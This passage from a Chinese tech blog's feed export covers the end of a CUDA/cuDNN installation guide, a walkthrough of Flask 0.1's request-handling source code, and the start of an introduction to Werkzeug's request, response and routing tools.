make</span><br><span class="line">./deviceQuery</span><br></pre></td></tr></table></figure><p>若最后一行的结果为<code>Result = PASS</code>，说明安装成功。</p><h2 id="安装cuDNN"><a href="#安装cuDNN" class="headerlink" title="安装cuDNN"></a>安装cuDNN</h2><p>最后，去官网找对应版本的cuDNN，这里我选择的是7.5（7.4也是可以的），下载（这里需要登陆Nvidia才可以）</p><p>将下载好的压缩包解压，一般解压出来的目录为cuda，拷贝到CUDA中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo cp cuda/include/cudnn.h /usr/<span class="built_in">local</span>/cuda/include/ </span><br><span class="line">sudo cp cuda/lib64/libcudnn* /usr/<span class="built_in">local</span>/cuda/lib64/</span><br></pre></td></tr></table></figure><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>至此，CUDA已安装完成，装个gpu版本的tensorflow试试（你也可以先使用virtualenv创建个虚拟环境再安装）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install tensorflow-gpu  <span class="comment"># 这里pip3需要手动下载</span></span><br></pre></td></tr></table></figure><p>装好后，进入python交互环境，试试<code>Hello World</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hello = tf.constant(<span class="string">'Hello World'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sess = tf.Session()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sess.run(hello)</span><br><span class="line"><span class="string">b'Hello World'</span></span><br></pre></td></tr></table></figure><p>执行后，会有日志打印，若没有报错，即证明安装成功。</p><hr><p>参考：</p><ul><li><a href="https://blog.csdn.net/qq_32408773/article/details/84111244" target="_blank" rel="noopener">https://blog.csdn.net/qq_32408773/article/details/84111244</a></li><li><a href="https://blog.csdn.net/u010801439/article/details/80483036" target="_blank" rel="noopener">https://blog.csdn.net/u010801439/article/details/80483036</a></li><li><a href="https://www.jianshu.com/p/6f54b4f96556" target="_blank" rel="noopener">https://www.jianshu.com/p/6f54b4f96556</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;本篇写于2019-4-25&lt;/p&gt;
&lt;p&gt;这两天装Ubuntu18.04双系统简直装到崩溃。一是非常著名的开机卡死在Logo界面的问题，另一
      
    
    </summary>
    
      <category term="机器学习" scheme="https://mingliangliu.com/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="机器学习" scheme="https://mingliangliu.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="Linux" scheme="https://mingliangliu.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Flask源码浅析</title>
    <link href="https://mingliangliu.com/2019/04/19/Flask%E6%BA%90%E7%A0%81%E6%B5%85%E6%9E%90/"/>
    <id>https://mingliangliu.com/2019/04/19/Flask源码浅析/</id>
    <published>2019-04-19T15:38:55.000Z</published>
    <updated>2019-08-04T16:31:45.328Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>学习一样东西，要先知其然，然后知其所以然。</p><p>这次，我们看看Flask Web框架的源码。我会以Flask 0.1的源码为例，把重点放在Flask如何处理请求上，看一看从一个请求到来到返回响应都经过了什么过程。</p><p>你可能会问，为什么以Flask 0.1为例啊，那都是好几年前的一坨老代码了？老，并不代表没有用。相反，Flask 0.1的源码设计极为精妙，包含了Flask的主干部分，整个项目只有一个文件，六百行左右，分析起来也简单，有利于我们了解整个Flask的脉络。你可以从<a href="https://github.com/pallets/flask/tree/0.1" target="_blank" rel="noopener">这里</a>来获取Flask 0.1的源码。</p><h2 id="Flask中定义的几个的类和函数"><a href="#Flask中定义的几个的类和函数" class="headerlink" title="Flask中定义的几个的类和函数"></a>Flask中定义的几个的类和函数</h2><p>在Flask 0.1的源码中，一共定义了五个类：</p><ol><li><code>Request</code>和<code>Response</code>, 它们分别是Flask的请求和响应对象，分别继承自Werkzeug中的请求和响应类</li><li><code>_RequestContext</code>，请求上下文类。它包含了所有请求的相关信息。包括程序实例app，url匹配器，请求对象，session对象，g对象以及用于记录闪现的消息的<code>flashes</code></li><li><code>_RequestGlobals</code>，使用该类创建g对象，这个对象内没有任何的属性，你可以给该类的实例（即g）绑定任何的全局属性。</li><li><code>Flask</code>，它是整个Flask框架的中心类，它实现了WSGI程序用于处理请求和响应，并且，它是整个所有视图函数、模板配置、URL规则的中心注册处。</li></ol><p>另外，Flask中还定义了一些函数：如<code>render_template</code>、 <code>url_for</code>、<code>flash</code>、<code>get_flashed_messages</code>等，相信大家都知道这些函数的作用，我就不在赘述。下面我们着重看看<code>Flask</code>类。</p><h2 id="Flask中本地上下文"><a href="#Flask中本地上下文" class="headerlink" title="Flask中本地上下文"></a>Flask中本地上下文</h2><p>在flask.py文件的最后，定义了几个全局对象：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_request_ctx_stack = LocalStack()</span><br><span class="line">current_app = LocalProxy(<span class="keyword">lambda</span>: _request_ctx_stack.top.app)</span><br><span class="line">request = LocalProxy(<span class="keyword">lambda</span>: _request_ctx_stack.top.request)</span><br><span class="line">session = LocalProxy(<span class="keyword">lambda</span>: _request_ctx_stack.top.session)</span><br><span class="line">g = LocalProxy(<span class="keyword">lambda</span>: _request_ctx_stack.top.g)</span><br></pre></td></tr></table></figure><p>其中，<code>_request_ctx_stack</code>是Flask的请求上下文堆栈，它的栈顶即是当前请求上下文对象的实例，当一个请求到来时，Flask会将一个请求上下文对象推入这个堆栈以便在程序中使用。<code>current_app</code>、<code>request</code>、<code>session</code>和<code>g</code>通过代理的方式从上下文堆栈中获取到所需要的值。如果你还不清楚<code>LocalStack</code>和<code>LocalProxy</code>，可以参见<a href="/2019/04/09/什么是Werkzeug/#more">什么时Werkzeug</a></p><h2 id="Flask类"><a href="#Flask类" class="headerlink" title="Flask类"></a>Flask类</h2><p>下面，我们重点看一下Flask类是如何定义的。</p><h3 id="从Flask类开头和-init-看起"><a href="#从Flask类开头和-init-看起" class="headerlink" title="从Flask类开头和__init__看起"></a>从Flask类开头和<code>__init__</code>看起</h3><p>在开始处，我们会看到Flask将<code>Request</code>和<code>Response</code>分别赋值给了<code>request_class</code>和<code>response_class</code>.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">request_class = Request</span><br><span class="line">response_class = Response</span><br></pre></td></tr></table></figure><p>Flask并没有在程序中直接使用<code>Request</code>和<code>Response</code>来生成请求和响应对象，而是通过调用<code>request_class</code>和<code>response_class</code>来生成，这就给我们自定义请求和响应类提供了方便。你可以通过继承Flask中的请求和响应类来构建自己的请求和响应类，并将它们赋值给<code>request_class</code>和<code>response_class</code>即可。</p><p>在下面：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">static_path = <span class="string">'/static'</span></span><br><span class="line">secret_key = <span class="keyword">None</span></span><br><span class="line">session_cookie_name = <span class="string">'session'</span></span><br></pre></td></tr></table></figure><p>我们可以看到在这里Flask定义了静态资源的目录，密钥以及cookie的名称，当然，这些你也可以手动进行修改。</p><p>下面，我们看一看<code>__init__</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, package_name)</span>:</span></span><br><span class="line">    self.debug = <span class="keyword">False</span>  <span class="comment"># 是否开启调试</span></span><br><span class="line"></span><br><span class="line">    self.package_name = package_name</span><br><span class="line"></span><br><span class="line">    self.root_path = _get_package_path(self.package_name)  <span class="comment"># 程序的根目录</span></span><br><span class="line"></span><br><span class="line">    self.view_functions = &#123;&#125;  <span class="comment"># 用于保存注册的视图函数</span></span><br><span class="line"></span><br><span class="line">    self.error_handlers = &#123;&#125;  <span class="comment"># 保存注册的错误处理函数</span></span><br><span class="line"></span><br><span class="line">    self.before_request_funcs = []  <span class="comment"># 保存请求开始时前调用的函数</span></span><br><span class="line"></span><br><span class="line">    self.after_request_funcs = []  <span class="comment"># 保存请求完成后调用的函数</span></span><br><span class="line"></span><br><span class="line">    self.url_map = Map()  <span class="comment"># 保存路由规则</span></span><br></pre></td></tr></table></figure><p>可以看到，我们用字典来保存注册的视图函数和错误处理函数，以及用列表保存请求前后要掉用的函数。其中用一个<code>Map</code>对象<code>url_map</code>来保存我们对URL进行处理的路由规则，其中每个路由规则为一个<code>Rule</code>对象，我们会在下文看到。另外，<code>__init__</code>中还定义的用于保存模板函数的属性，以及Jinja2环境对象，这里不在一一列出。</p><h3 id="用于注册视图函数的装饰器"><a href="#用于注册视图函数的装饰器" class="headerlink" title="用于注册视图函数的装饰器"></a>用于注册视图函数的装饰器</h3><p>众所周知，我们可以使用下面的方式来注册视图函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Hello World'</span></span><br></pre></td></tr></table></figure><p>我们看一下这个装饰器是如何实现的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">route</span><span class="params">(self, rule, **options)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decorator</span><span class="params">(f)</span>:</span></span><br><span class="line">        self.add_url_rule(rule, f.__name__, **options)</span><br><span class="line">        self.view_functions[f.__name__] = f</span><br><span class="line">        <span class="keyword">return</span> f</span><br><span class="line">    <span class="keyword">return</span> decorator</span><br></pre></td></tr></table></figure><p>在<code>route</code>中，会对我们传入的视图函数进行包装，首先调用Flask中的<code>add_url_rule</code>方法，然后以函数名为键，将视图函数保存在<code>__init__</code>中定义的用于保存视图函数的<code>view_functions</code>字典中。</p><p>下面，我们看看在<code>add_url_rule(rule, f.__name__, **options)</code>内部发生了什么：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_url_rule</span><span class="params">(self, rule, endpoint, **options)</span>:</span></span><br><span class="line">    options[<span class="string">'endpoint'</span>] = endpoint</span><br><span class="line">    options.setdefault(<span class="string">'methods'</span>, (<span class="string">'GET'</span>,))  <span class="comment">#  默认监听GET方法</span></span><br><span class="line">    self.url_map.add(Rule(rule, **options))</span><br></pre></td></tr></table></figure><p>在<code>add_url_rule</code>中，Flask首先将以<code>&#39;endpoint&#39;</code>为键，将端点值放入<code>options</code>中。如果<code>options</code>没有<code>&#39;methods&#39;</code>键，Flask会在这里给我们添加一个默认的GET方法，也就是说，当我们直接使用<code>@app.route(&#39;/&#39;)</code>，而不传入监听的方法时，Flask会默认监听GET方法。最后，Flask以当前的<code>rule</code>和<code>options</code>创建一个<code>Rule</code>对象放入到<code>url_map</code>中，为我们的程序新增了一条路由规则。</p><p>另外，除了<code>route</code>装饰器外，Flask中还有还提供了用于注册错误函数、请求前调用的函数、请求后调用的函数等的装饰器，这些装饰器和<code>route</code>装饰器基本相同，只是没有添加路由规则这个功能。例如请求处理前调用的函数的的装饰器:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">before_request</span><span class="params">(self, f)</span>:</span></span><br><span class="line">    self.before_request_funcs.append(f)</span><br><span class="line">    <span class="keyword">return</span> f</span><br></pre></td></tr></table></figure><h2 id="Flask请求响应流程"><a href="#Flask请求响应流程" class="headerlink" title="Flask请求响应流程"></a>Flask请求响应流程</h2><p>Flask中定义了<code>wsgi_app(self, environ, start_response)</code>方法作为WSGI的程序，它并没有写死在<code>__call__</code>方法中，因此可以为其添加中间件。当请求到来时，WSGI服务器会调用此方法，并将请求的参数和用于发起响应的函数作为参数传递给它。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wsgi_app</span><span class="params">(self, environ, start_response)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> self.request_context(environ):</span><br><span class="line">        rv = self.preprocess_request()  <span class="comment"># 预处理请求</span></span><br><span class="line">        <span class="keyword">if</span> rv <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">            rv = self.dispatch_request()  <span class="comment"># 请求分发</span></span><br><span class="line">        response = self.make_response(rv)  <span class="comment"># 生成响应</span></span><br><span class="line">        response = self.process_response(response)  <span class="comment"># 响应处理</span></span><br><span class="line">        <span class="keyword">return</span> response(environ, start_response)</span><br></pre></td></tr></table></figure><p>Flask在<code>with</code>语句下执行相关操作，这会触发<code>_RequestContext</code>中的<code>__enter__</code>方法，从而推送请求上下文到堆栈中。在<code>with</code>中，Flask先通过<code>preprocess_request()</code>预处理请求，在<code>preprocess_request()</code>中调用所有在<code>beforce_request()</code>装饰器中注册的<strong>请求前要调用的函数</strong>。随后，Flask使用<code>dispatch_request()</code>来进行请求分发，获得视图函数的返回值或是错误处理器的返回值。然后Falsk将请求分发时获得的返回值传给<code>make_response()</code>方法来生成一个响应对象，接下来，Flask在<code>process_response()</code>方法中调用所有在<code>after_request()</code>装饰器中注册的<strong>请求完成后要调用的函数</strong>。最后，通过<code>response</code>来发起一个响应，这会自动调用<code>start_response</code>方法来发起响应并将响应的值返回给WSGI服务器。</p><h3 id="预处理请求"><a href="#预处理请求" class="headerlink" title="预处理请求"></a>预处理请求</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">preprocess_request</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> func <span class="keyword">in</span> self.before_request_funcs:</span><br><span class="line">            rv = func()</span><br><span class="line">            <span class="keyword">if</span> rv <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">                <span class="keyword">return</span> rv</span><br></pre></td></tr></table></figure><p>上面的函数会在实际的请求分发之前调用，而且将会调用每一个使用<code>before_request()</code>装饰的函数。如果其中某一个函数返回一个值，这个值将会作为视图返回值处理并停止进一步的请求处理。</p><h3 id="请求分发"><a href="#请求分发" class="headerlink" title="请求分发"></a>请求分发</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dispatch_request</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        endpoint, values = self.match_request()</span><br><span class="line">        <span class="keyword">return</span> self.view_functions[endpoint](**values)</span><br><span class="line">    <span class="keyword">except</span> HTTPException, e:</span><br><span class="line">        handler = self.error_handlers.get(e.code)</span><br><span class="line">        <span class="keyword">if</span> handler <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">return</span> e</span><br><span class="line">        <span class="keyword">return</span> handler(e)</span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        handler = self.error_handlers.get(<span class="number">500</span>)</span><br><span class="line">        <span class="keyword">if</span> self.debug <span class="keyword">or</span> handler <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">raise</span></span><br><span class="line">        <span class="keyword">return</span> handler(e)</span><br></pre></td></tr></table></figure><p>在上面的方法中，Flask对URL进行匹配获取端点值和参数，然后调用相应的视图函数并将视图函数的返回值返回，或者返回相应的错误处理器的返回值。这里的返回值不一定是响应对象，比如我们可以在视图函数中返回一个字符串或者是使用<code>render_template()</code>渲染好的模板，所以，为了能够将返回值转换成合适的对象，我们需要<code>make_response()</code>方法来生成响应</p><h3 id="生成响应"><a href="#生成响应" class="headerlink" title="生成响应"></a>生成响应</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_response</span><span class="params">(self, rv)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    rv允许的类型如下所示：</span></span><br><span class="line"><span class="string">    ======================= ===============================================</span></span><br><span class="line"><span class="string">    response_class          这个对象将被直接返回</span></span><br><span class="line"><span class="string">    str                     使用这个字符串作为主体创建一个请求对象</span></span><br><span class="line"><span class="string">    unicode                 将这个字符串进行utf-8编码后作为主体创建一个请求对象</span></span><br><span class="line"><span class="string">    tuple                   使用这个元组的内容作为参数创建一个请求对象</span></span><br><span class="line"><span class="string">    a WSGI function         这个函数将作为WSGI程序调用并缓存为响应对象</span></span><br><span class="line"><span class="string">    ======================= ===============================================</span></span><br><span class="line"><span class="string">    :param rv: 视图函数返回值</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(rv, self.response_class):</span><br><span class="line">        <span class="keyword">return</span> rv</span><br><span class="line">    <span class="keyword">if</span> isinstance(rv, basestring):</span><br><span class="line">        <span class="keyword">return</span> self.response_class(rv)</span><br><span class="line">    <span class="keyword">if</span> isinstance(rv, tuple):</span><br><span class="line">        <span class="keyword">return</span> self.response_class(*rv)</span><br><span class="line">    <span class="keyword">return</span> self.response_class.force_type(rv, request.environ)</span><br></pre></td></tr></table></figure><p>在上面的方法中，也印证了我们上面所说的请求分发中<strong>视图函数的返回值不一定是请求对象</strong>这一点。所以，我们在<code>make_response</code>方法中对请求分发中获取的返回值的类型进行判断，通过不同的方式来创建真正的响应对象并返回。</p><h3 id="响应处理"><a href="#响应处理" class="headerlink" title="响应处理"></a>响应处理</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">process_response</span><span class="params">(self, response)</span>:</span></span><br><span class="line">    session = _request_ctx_stack.top.session</span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">        self.save_session(session, response)</span><br><span class="line">    <span class="keyword">for</span> handler <span class="keyword">in</span> self.after_request_funcs:</span><br><span class="line">        response = handler(response)</span><br><span class="line">    <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure><p>响应处理和预处理请求类似，都会循环调用所有注册的<strong>请求后调用的函数</strong>来对响应对象<code>response</code>进行处理，不过在此之前会先将session添加到响应对象中。</p><h3 id="返回响应"><a href="#返回响应" class="headerlink" title="返回响应"></a>返回响应</h3><p>我们Flask中的响应对象会继承自Werkzeug中的<code>Response</code>对象。<code>Response</code>的实例可以根据传入的参数，来发起一个特定的响应。你可以认为<code>Response</code>是你可以创建的另一个标准的WSGI应用，这个应用可以根据你传入的参数，来帮你做发起响应这件事。例如下面一个简易的WSGI程序：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">application</span><span class="params">(environ, start_response)</span>:</span></span><br><span class="line">    request = Request(environ)</span><br><span class="line">    response = Response(<span class="string">"Hello %s!"</span> % request.args.get(<span class="string">'name'</span>, <span class="string">'World!'</span>))</span><br><span class="line">    <span class="keyword">return</span> response(environ, start_response)</span><br></pre></td></tr></table></figure><p>好了，到此，Flask的一次请求就处理完了。不难发现，在Flask中，对Werzeug这个工具库是很依赖的，从请求处理，路由匹配，到发起请求，都可见到Werkzeug的身影。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>请求响应类，请求上下文类，全局对象类，核心类<code>Flask</code></p><p>Flask中，保存有视图函数、错误处理函数、路由规则，可以处理请求</p><p>请求处理流程：预处理请求、请求分发、生成响应、返回响应</p><hr><p>参考：</p><ul><li>《Flask Web开发实战》</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;学习一样东西，要先知其然，然后知其所以然。&lt;/p&gt;
&lt;p&gt;这次，我们看看Flask Web框架的源码。我会以Flask 0.1的源码为例，把
      
    
    </summary>
    
      <category term="Python" scheme="https://mingliangliu.com/categories/Python/"/>
    
    
      <category term="Python" scheme="https://mingliangliu.com/tags/Python/"/>
    
      <category term="Web" scheme="https://mingliangliu.com/tags/Web/"/>
    
      <category term="Flask" scheme="https://mingliangliu.com/tags/Flask/"/>
    
  </entry>
  
  <entry>
    <title>什么是Werkzeug</title>
    <link href="https://mingliangliu.com/2019/04/09/%E4%BB%80%E4%B9%88%E6%98%AFWerkzeug/"/>
    <id>https://mingliangliu.com/2019/04/09/什么是Werkzeug/</id>
    <published>2019-04-09T15:08:37.000Z</published>
    <updated>2019-08-04T16:31:45.361Z</updated>
    
    <content type="html"><![CDATA[<p>上一节介绍了<a href="/2019/04/06/什么是WSGI/#more">什么是WSGI</a>，这一节我们看看Werkzeug</p><p>按照官方的说法，Werkzeug(源自德语，工具的意思)是一个WSGI工具库，它开始于一个适用于WSGI的多样化的工具集，后来发展成了现在非常流行的WSGI工具库。Werkzeug可以在程序中单独使用，也作为许多Python Web框架的底层库，例如现在非常流行的Flask Web框架。</p><h2 id="Werkzeug的基本功能"><a href="#Werkzeug的基本功能" class="headerlink" title="Werkzeug的基本功能"></a>Werkzeug的基本功能</h2><p>正如官方的说法，Werkzeug提供了非常丰富的功能，但是其功能总的可分为两个方面：开发测试方面的功能和其用于Web程序中的工具函数及工具类</p><h3 id="开发测试方面"><a href="#开发测试方面" class="headerlink" title="开发测试方面"></a>开发测试方面</h3><p>一、Werkzeug提供了一个简易的开发用服务器<br>二、Werkzeug提供了一些测试工具，如<code>Client</code>类、<code>EnvironBuilder</code>类。<br>三、Werkzeug提供了Debug的工具，提供了可用于Debug的中间件。当程序出错时，并不会返回500错误，而是显示程序出错的地方以及出错的原因，这就为程序的开发提供了方便。</p><h3 id="工具方面"><a href="#工具方面" class="headerlink" title="工具方面"></a>工具方面</h3><p>Werkzeug主要提供了如下几种工具</p><h4 id="一、请求和相应对象。"><a href="#一、请求和相应对象。" class="headerlink" title="一、请求和相应对象。"></a>一、请求和相应对象。</h4><p>提供了<code>Request</code>和<code>Response</code>。<code>Request</code>可以包装WSGI服务器传入的<code>environ</code>参数，并对其进行进一步的解析，以使我们更容易的使用请求中的参数。<code>Response</code>可以根据传入的参数，来发起一个特定的响应。你可以认为<code>Response</code>是你可以创建的另一个标准的WSGI应用，这个应用可以根据你传入的参数，来帮你做发起响应这件事。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> werkzeug.wrappers <span class="keyword">import</span> Request, Response</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">application</span><span class="params">(environ, start_response)</span>:</span></span><br><span class="line">    request = Request(environ)</span><br><span class="line">    response = Response(<span class="string">"Hello %s!"</span> % request.args.get(<span class="string">'name'</span>, <span class="string">'World!'</span>))</span><br><span class="line">    <span class="keyword">return</span> response(environ, start_response)</span><br></pre></td></tr></table></figure><h4 id="二、路由解析。"><a href="#二、路由解析。" class="headerlink" title="二、路由解析。"></a>二、路由解析。</h4><p>Werkzeug提供了强大的路由解析功能。比如Flask框架中经常用到的<code>Rule</code>、<code>Map</code>类等。</p><p>如下面一个程序。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> werkzeug.routing <span class="keyword">import</span> Map, Rule, NotFound, RequestRedirect</span><br><span class="line"></span><br><span class="line">url_map = Map([</span><br><span class="line">    Rule(<span class="string">'/'</span>, endpoint=<span class="string">'blog/index'</span>),</span><br><span class="line">    Rule(<span class="string">'/&lt;int:year&gt;/&lt;int:month&gt;/&lt;int:day&gt;/'</span>, endpoint=<span class="string">'blog/archive'</span>),</span><br><span class="line">    Rule(<span class="string">'/about'</span>, endpoint=<span class="string">'blog/about_me'</span>),</span><br><span class="line">    Rule(<span class="string">'/feeds/&lt;feed_name&gt;.rss'</span>, endpoint=<span class="string">'blog/show_feed'</span>)</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">application</span><span class="params">(environ, start_response)</span>:</span></span><br><span class="line">    urls = url_map.bind_to_environ(environ)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        endpoint, args = urls.match()</span><br><span class="line">    <span class="keyword">except</span> HTTPException, e:</span><br><span class="line">        <span class="keyword">return</span> e(environ, start_response)</span><br><span class="line">    start_response(<span class="string">'200 OK'</span>, [(<span class="string">'Content-Type'</span>, <span class="string">'text/plain'</span>)])</span><br><span class="line">    <span class="keyword">return</span> [<span class="string">'Rule points to %r with arguments %r'</span> % (endpoint, args)]</span><br></pre></td></tr></table></figure><p>我们创建了一个<code>Map</code>类实例<code>url_map</code>来保存一系列的URL规则。并且给它传递了一个<code>Rule</code>对象的列表。其中，每个<code>Rule</code>对象都包含两个参数：一个字符串和<code>endpoint</code>。字符串代表了URL匹配的规则（也叫路由规则），<code>endpoint</code>（也叫端点）代表了该路由规则对应的视图函数。即当对一个URL匹配成功后，便可获取到它对应的视图函数。不同的规则可以对应相同的<code>endpoint</code>，但是必须有不同的参数用于URL的构建，不能产生歧义，类似于函数的重载。</p><p>在<code>application</code>函数中，我们使用<code>Map</code>的<code>bind_to_environ</code>方法将<code>url_map</code>与<code>environ</code>绑定，这会返回给我们一个新的<code>MapAdapter</code>对象，这个对象可用于URL的匹配。随后，我们调用<code>MapAdapter</code>对象中的<code>match()</code>方法，获取<strong>当前请求</strong>的URL匹配到的<code>endpoint</code>和其参数信息，最后，我们用获取到的<code>endpoint</code>和参数信息发起一个响应。</p><p>用于匹配URL的路由规则字符串是由基本的URL加上占位符组成的。</p><p>例如<code>Rule(&#39;/pages/&lt;path:page&gt;&#39;)</code>，尖括号中，冒号后面为变量名，前面为变量的类型。<code>path</code>类型表示只匹配路径。这里的<code>path</code>也可以是<code>int</code>，表示匹配一个整型以及<code>float</code>等。</p><p>当不包含尖括号中的变量不写明类型时，如<code>Rule(&#39;/pages/&lt;page&gt;&#39;)</code>，这里的<code>page</code>可以匹配任何字符串，但是只能就受一个路径段，因此不能含有<code>/</code>。</p><p>更详细的规则还请参见<a href="https://werkzeug.palletsprojects.com/en/0.15.x/routing/" target="_blank" rel="noopener">文档</a></p><h4 